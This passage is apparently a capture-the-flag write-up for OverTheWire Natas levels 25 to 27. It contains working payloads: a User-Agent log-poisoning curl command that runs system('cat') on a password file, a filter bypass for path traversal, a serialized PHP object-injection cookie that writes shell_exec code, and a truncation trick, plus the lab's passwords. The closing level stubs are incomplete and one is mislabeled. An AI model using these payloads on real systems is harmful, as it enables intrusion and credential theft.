            return 1;
    safeinclude("language/en"); 
}

function safeinclude($filename) {
    // check for directory traversal
    if (strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if (strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}

function listFiles($path) {
    $listoffiles=array();
    if ($handle = opendir($path))
        while (false !== ($file = readdir($handle)))
            if ($file != "." && $file != "..")
                $listoffiles[]=$file;
    
    closedir($handle);
    return $listoffiles;
} 

function logRequest($message) {
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
?>
```

I first tried exploiting the query payload passed into the server by setting:
```html
lang=/etc/natas_webpass/natas26:
```
Unfortunately, this only produced errors:

![Index file](/assets/images/25-2.png)

Analysing the source code again, this function looked interesting as it was writing the value of HTTP_USER_AGENT to a file:
```php
function logRequest($message) {
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```
The reason this is interesting is the value associated with HTTP_USER_AGENT can be modified, which means malicious PHP code can be written to the file. We will try to write the following php code:
```php
<?system("cat /etc/natas_webpass/natas26")?>
```
Next, we need a way to navigate to the log file where this payload is stored in order to get the php code to run. From the previous error message we know we are currently at:
```html
var/www/natas/natas25/language
```
but from the source code, the log file is at:
```php
$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
```
So then, all we need to do is traverse to:
```html
../logs/natas25_gdloi0iqq7dgsjvljb03lt6hod.log
```
But we also need to escape the filter from the server which tries to prevent directory traversal:
```php
if (strstr($filename,"../")) {
    logRequest("Directory traversal attempt! fixing request.");
    $filename=str_replace("../","",$filename);
}
```
Luckily, this check is thorough enough and only removes the first occurrence of ../ so:
```html
....// becomes ../
```
Here is the curl request we will use to get the password:
```bash
curl -s -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
  --cookie "PHPSESSID=gdloi0iqq7dgsjvljb03lt6hod" \
  -H 'User-Agent: <?system("cat /etc/natas_webpass/natas26")?>' \
  'http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_gdloi0iqq7dgsjvljb03lt6hod.log'
```

Which returns the password:
```html
[08.07.2025 03::39:43] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE <-- Password
"Directory traversal attempt! fixing request."
```
#### Natas 26 Solution

___
**URL :** <http://natas26.natas.labs.overthewire.org/> \
**Credentials :** *natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE*

We're given the following source code:
```php
<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->initMsg);
        fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}

function showImage($filename){
    if(file_exists($filename))
        echo "<img src=\"$filename\">";
}

function drawImage($filename){
    $img=imagecreatetruecolor(400,300);
    drawFromUserdata($img);
    imagepng($img,$filename);
    imagedestroy($img);
}

function drawFromUserdata($img){
    if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

        $color=imagecolorallocate($img,0xff,0x12,0x1c);
        imageline($img,$_GET["x1"], $_GET["y1"],
                        $_GET["x2"], $_GET["y2"], $color);
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        if($drawing)
            foreach($drawing as $object)
                if( array_key_exists("x1", $object) &&
                    array_key_exists("y1", $object) &&
                    array_key_exists("x2", $object) &&
                    array_key_exists("y2", $object)){

                    $color=imagecolorallocate($img,0xff,0x12,0x1c);
                    imageline($img,$object["x1"],$object["y1"],
                            $object["x2"] ,$object["y2"] ,$color);

                }
    }
}

function storeData(){
    $new_object=array();

    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        $new_object["x1"]=$_GET["x1"];
        $new_object["y1"]=$_GET["y1"];
        $new_object["x2"]=$_GET["x2"];
        $new_object["y2"]=$_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    else{
        // create new array
        $drawing=array();
    }

    $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing)));
}
?>
```
The first thing that catches my eye is the use of unserialize() which leads me to think there could be an object deserialization vulnerability. I noticed we're given a cookie called drawing:

![Index file](/assets/images/26-1.png)

This is what 'drawing' looks like after unserialisation:

![Index file](/assets/images/26-2.png)

Next, we will try to serialize our malicious code and replace it with the existing 'drawing' cookie. We will replace the existing Logger class with our own Logger class that will write the following code:
```php
<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>
```
to a log file that we have access to:
```html
/var/www/natas/natas26/img/natas26_v7r8ankdhkfvuo3jtpe6pe7dnu.php
```
The reason we chose this is because we currently have access to:
```html
img/natas26_v7r8ankdhkfvuo3jtpe6pe7dnu.png
```
Below is everything we will serialize:
```php
class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_2gfq31bqb22koati25vujtiof1.php";
    }
}

$logger = new Logger();
```
After serializing and base64 encoding, this will give:
```html
Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl8yZ2ZxMzFicWIyMmtvYXRpMjV2dWp0aW9mMS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30
```

Next, replace the value of the existing 'data' cookie with the encoding you just generated and refresh. Navigate to http://natas26.natas.labs.overthewire.org/img/natas26_2gfq31bqb22koati25vujtiof1.php and the password will be on the page:

![Index file](/assets/images/26-3.png)

#### Natas 27 Solution

___
**URL :** <http://natas27.natas.labs.overthewire.org/> \
**Credentials :** *natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne*

We're given the following source code:
```php
<?php
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if (mysqli_num_rows($res) > 0) {
        return True;
    }
    return False;
}


function validUser($link,$usr) {

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if ($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if (mysqli_affected_rows($link) > 0) {
        return True;
    }
    return False;
}


if (array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if (validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if (checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])) {
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        } else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    } else {
        //user doesn't exist
        if (createUser($link,$_REQUEST["username"],$_REQUEST["password"])) {
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
}
?>
```
I started by playing with the website and found that the server will create a new user if I try to log in as a user that doesn't exist yet:

![Index file](/assets/images/27-1.png)

I also get a data dump about my account if I try to login as an existing user:

![Index file](/assets/images/27-2.png)

I then tried to login as natas28, however, instead of creating a new user I get something else:

![Index file](/assets/images/27-3.png)

It seems this level likely involves finding the password for natas28, and then maybe the password for the next level will be provided in the data dump. So I then tested for SQL vulnerabilities using a simple SQL injection:
```sql
' OR 1=1; #
```

Unfortunately, this did not work as the source code uses mysqli_real_escape_string():

![Index file](/assets/images/27-4.png)

After reading the documentation for mysqli_real_escape_string() and looking for potential vulnerabilities, it seemed unlikely there was any SQL injection vulnerabilities. I then tried focusing on this particular function:
```php
function createUser($link, $usr, $pass){

    if ($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if (mysqli_affected_rows($link) > 0) {
        return True;
    }
    return False;
}
```

I had a closer look at dumpData() and realised since it calls trim(), if I was able to create a user called natas28 with multiple spaces this would technically evaluate to just natas28 and also return me info about the actual natas28 user.
```php
function dumpData($link,$usr){
    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if ($res) {
        if (mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}
```
We will use curl to make the request since the browser treats whitespaces weirdly:
```html
curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne -d 'username=natas28%20&password=password' http://natas27.natas.labs.overthewire.org/index.php
```
Unfortunately, this only returns:
```html
Go away hacker
```
because of this check on the server when we try to create a new user where trim() removes all trailing whitespace:
```php
if ($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```
We could add a random character to the end, like the following:
```html
natas28       X
```
but when dumpdata() is called, trim() won't turn it to natas28 and we will only get the data for natas28       X:
```html
Welcome natas28 X!<br>Here is your data:<br>Array
(
    [username] =&gt; natas28 X
    [password] =&gt; password
)
```
The key is in the next few lines in createUser():
```php
$user=mysqli_real_escape_string($link, substr($usr, 0, 64));
$password=mysqli_real_escape_string($link, substr($pass, 0, 64));
$query = "INSERT INTO users (username,password) values ('$user','$password')";
```
If we create a user beginning with natas28, 58 whitespaces and then a random character like A, this will pass the "Go away hacker" check, but then instead of adding natas28{58_spaces}X to the database, it will instead create natas28{58_spaces} since the substr() function has been specified to only take 65 characters. Then, all we need to do is log in as natas28{58_spaces} (since it exists now) which will give us the password found in the data dump:
```html
Welcome natas28                                                         !<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)
```

#### Natas 28 Solution

___
**URL :** <http://natas28.natas.labs.overthewire.org/> \
**Credentials :** *natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj*

#### Natas 29 Solution

___
**URL :** <http://natas29.natas.labs.overthewire.org/> \
**Credentials :** *natas29:*

#### Natas 26 Solution

___
**URL :** <http://natas30.natas.labs.overthewire.org/> \
**Credentials :** *natas30:*